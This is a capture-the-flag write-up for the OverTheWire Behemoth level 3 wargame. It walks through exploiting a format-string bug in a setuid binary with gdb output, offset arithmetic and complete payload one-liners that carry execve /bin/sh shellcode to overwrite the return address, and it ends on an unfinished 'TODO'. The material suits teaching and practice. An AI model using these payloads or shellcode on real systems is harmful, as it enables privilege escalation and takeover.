#Behemoth3

behemoth.labs.overthewire.org

**Username:** behemoth3
**Password:** see [behemoth2](https://github.com/Alpackers/CTF-Writeups/tree/master/Misc/OverTheWire/Behemoth/Behemoth2)
**Description:**  

This wargame deals with a lot of regular vulnerabilities found commonly 'out in the wild'. While the game makes no attempts at emulating a real environment it will teach you how to exploit several of the most common coding mistakes including buffer overflows, race conditions and privilege escalation. 

##Write-up

You know the routine by now.

```
# file behemoth3
behemoth3: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=c5dbd3c173034d55cfef4bb66829b1bd1ec42d22, not stripped
```

```
# ~/checksec.sh --file behemoth3
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   behemoth3
```

```
# ./behemoth3 
Identify yourself: AAAA
Welcome, AAAA

aaaand goodbye again.
```

Let's throw in the psudeocode for ```main``` just for good measure.

```C
int main(int arg0) {
    printf("Identify yourself: ");
    eax = *__TMC_END__;
    fgets(((esp & 0xfffffff0) - 0xe0) + 0x18, 0xc8, eax);
    printf("Welcome, ");
    printf(((esp & 0xfffffff0) - 0xe0) + 0x18);
    puts("\naaaand goodbye again.");
    return 0x0;
}
```

A quick try of a few commands and we are well on our way.

```
# python -c 'print "A"*1000' | ./behemoth3
Identify yourself: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
aaaand goodbye again.
```

Clear it's not a buffer overflow.

```
# python -c 'print "A"*4+"%x"*10' | ./behemoth3
Identify yourself: Welcome, AAAAc8f778fc2000f77db0004141414178257825782578257825782578257825

aaaand goodbye again.
# python -c 'print "A"*4+"%x"*6' | ./behemoth3
Identify yourself: Welcome, AAAAc8f777cc2000f77c800041414141

aaaand goodbye again.
```

And even more clear that we're dealing with a string format vulnerability.  It looks like our ```0x41414141``` is popped off after 6 ```%x```.  We can definately reference back to [narnia7](https://github.com/Alpackers/CTF-Writeups/tree/master/Misc/OverTheWire/Narnia/Narnia7) for this one. Let's first try to locate the memory address where our input starts as that will likely be where we want to point back to.

```asm
             main:
0804847d         push       ebp                                                 ; XREF=_start+23
0804847e         mov        ebp, esp
08048480         and        esp, 0xfffffff0
08048483         sub        esp, 0xe0
08048489         mov        dword [ss:esp], 0x8048570                           ; "Identify yourself: ", argument "format" for method j_printf
08048490         call       j_printf
08048495         mov        eax, dword [ds:__TMC_END__]                         ; __TMC_END__
0804849a         mov        dword [ss:esp+0x8], eax                             ; argument "stream" for method j_fgets
0804849e         mov        dword [ss:esp+0x4], 0xc8                            ; argument "size" for method j_fgets
080484a6         lea        eax, dword [ss:esp+0x18]
080484aa         mov        dword [ss:esp], eax                                 ; argument "str" for method j_fgets
080484ad         call       j_fgets
080484b2         mov        dword [ss:esp], 0x8048584                           ; "Welcome, ", argument "format" for method j_printf
080484b9         call       j_printf
080484be         lea        eax, dword [ss:esp+0x18]
080484c2         mov        dword [ss:esp], eax                                 ; argument "format" for method j_printf
080484c5         call       j_printf
080484ca         mov        dword [ss:esp], 0x804858e                           ; "\\naaaand goodbye again.", argument "s" for method j_puts
080484d1         call       j_puts
080484d6         mov        eax, 0x0
080484db         leave      
080484dc         ret        
                        ; endp
```

We can set a breakpoint after we read our input and examine the stack.

```
# python -c 'print "A"*4+"%x"*6' > input
# gdb behemoth3
(gdb) break * 0x080484b2
Breakpoint 1 at 0x80484b2
(gdb) run < input
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /root/CTF/OverTheWire/behemoth/behemoth3 < input

Breakpoint 1, 0x080484b2 in main ()
(gdb) x/25x $esp
0xffffd170:	0xffffd188	0x000000c8	0xf7fb1c20	0x00000000
0xffffd180:	0x00000000	0xf7ffd000	0x41414141	0x78257825
0xffffd190:	0x78257825	0x78257825	0xffff000a	0x08048200
0xffffd1a0:	0xffffd208	0xf7ffda8c	0x00000000	0xf7fd9b58
0xffffd1b0:	0x00000001	0x00000000	0x00000001	0xf7ffd930
0xffffd1c0:	0xf7ff6300	0x00000000	0xf7e0a940	0x00000001
0xffffd1d0:	0x00000003
```

Looks like our input starts at ```0xffffd188```.  Our payload should look something like ```<address of first byte>JUNK<address of second byte>JUNK<address of third byte>JUNK<address of fourth byte><shellcode>%x%x%x%<first width>x%n%<second width>x%n%<third width>x%n%<fourth width>x%n```.  This means our shellcode should start at ```0xffffd1a4``` if we did our math right.  Now let's find out where the return address is.

```
(gdb) break * 0x80484dc
Breakpoint 1 at 0x80484dc
(gdb) run
Starting program: /root/CTF/OverTheWire/behemoth/behemoth3 
Identify yourself: Test
Welcome, Test

aaaand goodbye again.

Breakpoint 1, 0x080484dc in main ()
(gdb) x/10x $esp
0xffffd25c:	0xf7e24a63	0x00000001	0xffffd2f4	0xffffd2fc
0xffffd26c:	0xf7feb7da	0x00000001	0xffffd2f4	0xffffd294
0xffffd27c:	0x08049798	0x08048230
```

So basically our goal is to overwrite ```0xffffd25c``` with ```0xffffd1a4```.  Let's go ahead and try to calculate our first width.  To do that we need to find out what gets written by default, and the use the ```"the byte to be written" - "the outputted byte" + 8``` formula.

```
# python -c 'print "\x5c\xd2\xff\xffJUNK\x5d\xd2\xff\xffJUNK\x5e\xd2\xff\xffJUNK\x5f\xd2\xff\xff"+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"%x"*4+"%8x%n"' > input
```
```
(gdb) run < input
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /root/CTF/OverTheWire/behemoth/behemoth3 < input
Identify yourself: Welcome, \���JUNK]���JUNK^���JUNK_���1ۍC�̀1�Qhn/shh//bi�A
                                                                            ��̀c8f7fb1c2000f7ffd000

aaaand goodbye again.

Breakpoint 1, 0x080484dc in main ()
(gdb) x/10x $esp
0xffffd25c:	0x0000004c	0x00000001	0xffffd2f4	0xffffd2fc
0xffffd26c:	0xf7feb7da	0x00000001	0xffffd2f4	0xffffd294
0xffffd27c:	0x08049798	0x08048230
(gdb) p 0xa4 - 0x4c + 8
$1 = 96
```
```
# python -c 'print "\x5c\xd2\xff\xffJUNK\x5d\xd2\xff\xffJUNK\x5e\xd2\xff\xffJUNK\x5f\xd2\xff\xff"+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"%x"*4+"%96x%n"' > input
```
```
(gdb) run < input
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /root/CTF/OverTheWire/behemoth/behemoth3 < input
Identify yourself: Welcome, \���JUNK]���JUNK^���JUNK_���1ۍC�̀1�Qhn/shh//bi�A
                                                                            ��̀c8f7fb1c2000                                                                                        f7ffd000

aaaand goodbye again.

Breakpoint 1, 0x080484dc in main ()
(gdb) x/10x $esp
0xffffd25c:	0x000000a4	0x00000001	0xffffd2f4	0xffffd2fc
0xffffd26c:	0xf7feb7da	0x00000001	0xffffd2f4	0xffffd294
0xffffd27c:	0x08049798	0x08048230
```

Perfect.  We got our first byte done.  The to calculate the rest.  The other bytes will follow the format of ```"the byte we want to write" - "the previous byte"```.

```
(gdb) p 0xd1 - 0xa4
$3 = 45
```
```
# python -c 'print "\x5c\xd2\xff\xffJUNK\x5d\xd2\xff\xffJUNK\x5e\xd2\xff\xffJUNK\x5f\xd2\xff\xff"+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"%x"*4+"%96x%n%45x%n"' > input
```
```
(gdb) run < input
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /root/CTF/OverTheWire/behemoth/behemoth3 < input
Identify yourself: Welcome, \���JUNK]���JUNK^���JUNK_���1ۍC�̀1�Qhn/shh//bi�A
                                                                            ��̀c8f7fb1c2000                                                                                        f7ffd000                                     4b4e554a

aaaand goodbye again.

Breakpoint 1, 0x080484dc in main ()
(gdb) x/10x $esp
0xffffd25c:	0x0000d1a4	0x00000000	0xffffd2f4	0xffffd2fc
0xffffd26c:	0xf7feb7da	0x00000001	0xffffd2f4	0xffffd294
0xffffd27c:	0x08049798	0x08048230
(gdb) p 0xff - 0xd1
$4 = 46
```
```
# python -c 'print "\x5c\xd2\xff\xffJUNK\x5d\xd2\xff\xffJUNK\x5e\xd2\xff\xffJUNK\x5f\xd2\xff\xff"+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"%x"*4+"%96x%n%45x%n%46x%n"' > input
```
```
(gdb) run < input
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /root/CTF/OverTheWire/behemoth/behemoth3 < input
Identify yourself: Welcome, \���JUNK]���JUNK^���JUNK_���1ۍC�̀1�Qhn/shh//bi�A
                                                                            ��̀c8f7fb1c2000                                                                                        f7ffd000                                     4b4e554a                                      4b4e554a

aaaand goodbye again.

Breakpoint 1, 0x080484dc in main ()
(gdb) x/10x $esp
0xffffd25c:	0x00ffd1a4	0x00000000	0xffffd2f4	0xffffd2fc
0xffffd26c:	0xf7feb7da	0x00000001	0xffffd2f4	0xffffd294
0xffffd27c:	0x08049798	0x08048230
(gdb) p 0x1ff - 0xff
$5 = 256
```
```
# python -c 'print "\x5c\xd2\xff\xffJUNK\x5d\xd2\xff\xffJUNK\x5e\xd2\xff\xffJUNK\x5f\xd2\xff\xff"+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"%x"*4+"%96x%n%45x%n%46x%n%256x%n"' > input
```
```
(gdb) run < input
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /root/CTF/OverTheWire/behemoth/behemoth3 < input
Identify yourself: Welcome, \���JUNK]���JUNK^���JUNK_���1ۍC�̀1�Qhn/shh//bi�A
                                                                            ��̀c8f7fb1c2000                                                                                        f7ffd000                                     4b4e554a                                      4b4e554a                                                                                                                                                                                                                                                        4b4e554a

aaaand goodbye again.

Breakpoint 1, 0x080484dc in main ()
(gdb) x/10x $esp
0xffffd25c:	0xffffd1a4	0x00000001	0xffffd2f4	0xffffd2fc
0xffffd26c:	0xf7feb7da	0x00000001	0xffffd2f4	0xffffd294
0xffffd27c:	0x08049798	0x08048230
(gdb) c
Continuing.
process 1737 is executing new program: /bin/dash
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x80484dc
```

It's a beautiful thing.  Let's head to the server.

```
behemoth3@melinda:/behemoth$ gdb behemoth3
(gdb) break * 0x80484b2
Breakpoint 1 at 0x80484b2
(gdb) break * 0x80484dc
Breakpoint 2 at 0x80484dc
(gdb) run
Starting program: /games/behemoth/behemoth3 
Identify yourself: AAAA

Breakpoint 1, 0x080484b2 in main ()
(gdb) x/10x $esp
0xffffd5e0:	0xffffd5f8	0x000000c8	0xf7fcac20	0x00000000
0xffffd5f0:	0x00000000	0xf7ffd000	0x41414141	0xf7ff000a
0xffffd600:	0xffffd6c0	0xf7fe57aa
(gdb) c
Continuing.
Welcome, AAAA

aaaand goodbye again.

Breakpoint 2, 0x080484dc in main ()
(gdb) x/10x $esp
0xffffd6cc:	0xf7e3ca63	0x00000001	0xffffd764	0xffffd76c
0xffffd6dc:	0xf7feacea	0x00000001	0xffffd764	0xffffd704
0xffffd6ec:	0x08049798	0x08048230
```

Ok, on the server our input starts at ```0xffffd5f8``` (shellcode at ```0xffffd614```) with our return address at ```0xffffd6cc```.  Note to self, do this on the server the first time around.  Looks like we have to recalculate everything.

```
behemoth3@melinda:/behemoth$ mktemp -d
/tmp/tmp.klO9V3AtZQ
behemoth3@melinda:/behemoth$ cd /tmp/tmp.klO9V3AtZQ
behemoth3@melinda:/tmp/tmp.klO9V3AtZQ$ python -c 'print "\xcc\xd6\xff\xffJUNK\xcd\xd6\xff\xffJUNK\xce\xd6\xff\xffJUNK\xcf\xd6\xff\xff"+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"%x"*4+"%8x%n"' > input
```
```
(gdb) run < /tmp/tmp.klO9V3AtZQ/input
Starting program: /games/behemoth/behemoth3 < /tmp/tmp.klO9V3AtZQ/input
Identify yourself: Welcome, ����JUNK����JUNK����JUNK����1ۍC�̀1�Qhn/shh//bi�A
                                                                            ��̀c8f7fcac2000f7ffd000

aaaand goodbye again.

Program received signal SIGSEGV, Segmentation fault.
0x0000004c in ?? ()
```
 
 A few quick calculations to reproduce our numbers.
 
 ```
(gdb) p 0x114 - 0x4c + 8
$1 = 208
(gdb) p 0x1d6 - 0x114
$2 = 194
(gdb) p 0x1ff - 0x1d6
$3 = 41
(gdb) p 0x2ff - 0x1ff
$4 = 256
 ```
 
 And let's try to run it.

```
behemoth3@melinda:/behemoth$ python -c 'print "\xcc\xd6\xff\xffJUNK\xcd\xd6\xff\xffJUNK\xce\xd6\xff\xffJUNK\xcf\xd6\xff\xff"+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"%x"*4+"%208x%n%194x%n%41x%n%256x%n"' | ./behemoth3 
Identify yourself: Welcome, ����JUNK����JUNK����JUNK����1ۍC�̀1�Qhn/shh//bi�A
                                                                            ��̀c8f7fcac20f7ff2eb62                                                                                                                                                                                                        f7ffd000                                                                                                                                                                                          4b4e554a                                 4b4e554a                                                                                                                                                                                                                                                        4b4e554a

aaaand goodbye again.
```

Hmm...no errors, but no command prompt.  Let's try our bash tricks.

```
behemoth3@melinda:/behemoth$ (python -c 'print "\xcc\xd6\xff\xffJUNK\xcd\xd6\xff\xffJUNK\xce\xd6\xff\xffJUNK\xcf\xd6\xff\xff"+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"%x"*4+"%208x%n%194x%n%41x%n%256x%n"';cat) | ./behemoth3 
Identify yourself: Welcome, ����JUNK����JUNK����JUNK����1ۍC�̀1�Qhn/shh//bi�A
                                                                            ��̀c8f7fcac20f7ff2eb62                                                                                                                                                                                                        f7ffd000                                                                                                                                                                                          4b4e554a                                 4b4e554a                                                                                                                                                                                                                                                        4b4e554a

aaaand goodbye again.
whoami
behemoth3@melinda:/behemoth$
```

Well, that kept a prompt open for the ```cat``` command, but didn't seem to execute anything in our shell.  Let's open up gdb and see what's going on.

```
behemoth3@melinda:/behemoth$ mktemp -d
/tmp/tmp.klO9V3AtZQ
behemoth3@melinda:/tmp/tmp.klO9V3AtZQ$ python -c 'print "\xcc\xd6\xff\xffJUNK\xcd\xd6\xff\xffJUNK\xce\xd6\xff\xffJUNK\xcf\xd6\xff\xff"+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"%x"*4+"%208x%n%194x%n%41x%n%256x%n"' > input
```
``` 
(gdb) run < /tmp/tmp.klO9V3AtZQ/input
Starting program: /games/behemoth/behemoth3 < /tmp/tmp.klO9V3AtZQ/input
Identify yourself: Welcome, ����JUNK����JUNK����JUNK����1ۍC�̀1�Qhn/shh//bi�A
                                                                            ��̀c8f7fcac2000                                                                                                                                                                                                        f7ffd000                                                                                                                                                                                          4b4e554a                                 4b4e554a                                                                                                                                                                                                                                                        4b4e554a

aaaand goodbye again.
process 21053 is executing new program: /bin/dash
[Inferior 1 (process 21053) exited normally]
```

After much pain and gnashing of teeth I found something that would work.  I ended up actually switching out the shellcode.  Our address for the return is now at ```0xffffd62c``` and our shellcode is at ```0xffffd574```.

```
behemoth3@melinda:/tmp/tmp.yY7LmGZNQr$ python -c 'print "\x2c\xd6\xff\xffJUNK\x2d\xd6\xff\xffJUNK\x2e\xd6\xff\xffJUNK\x2f\xd6\xff\xff"+"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"%x"*4+"%8x%n"' > input
```
```
(gdb) run < input
Starting program: /games/behemoth/behemoth3 < input
Identify yourself: Welcome, ,���JUNK-���JUNK.���JUNK/���1�1۰̀Sh/ttyh/dev��1�f�'�̀1�Ph//shh/bin��PS�ᙰ
     c8f7fcac2000f7ffd000

aaaand goodbye again.

Program received signal SIGSEGV, Segmentation fault.
0x00000067 in ?? ()
(gdb) p 0x74 - 0x67 + 8
$1 = 21
(gdb) p 0xd5 - 0x74
$2 = 97
(gdb) p 0xff - 0xd5
$3 = 42
(gdb) p 0x1ff - 0xff
$4 = 256
```
```
behemoth3@melinda:/tmp/tmp.yY7LmGZNQr$ python -c 'print "\x2c\xd6\xff\xffJUNK\x2d\xd6\xff\xffJUNK\x2e\xd6\xff\xffJUNK\x2f\xd6\xff\xff"+"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"%x"*4+"%21x%n%97x%n%42x%n%256x%n"' > input
```
```
behemoth3@melinda:/behemoth$ gdb behemoth3
(gdb) run < input
Starting program: /games/behemoth/behemoth3 < input
/bin/bash: input: No such file or directory
During startup program exited with code 1.
(gdb) run < /tmp/tmp.yY7LmGZNQr/input
Starting program: /games/behemoth/behemoth3 < /tmp/tmp.yY7LmGZNQr/input
Identify yourself: Welcome, ,���JUNK-���JUNK.���JUNK/���1�1۰̀Sh/ttyh/dev��1�f�'�̀1�Ph//shh/bin��PS�ᙰ
     c8f7fcac2000             f7ffd000                                                                                         4b4e554a                                  4b4e554a                                                                                                                                                                                                                                                        4b4e554a

aaaand goodbye again.
process 4305 is executing new program: /bin/dash
$ exit
[Inferior 1 (process 4305) exited normally]
```

TODO
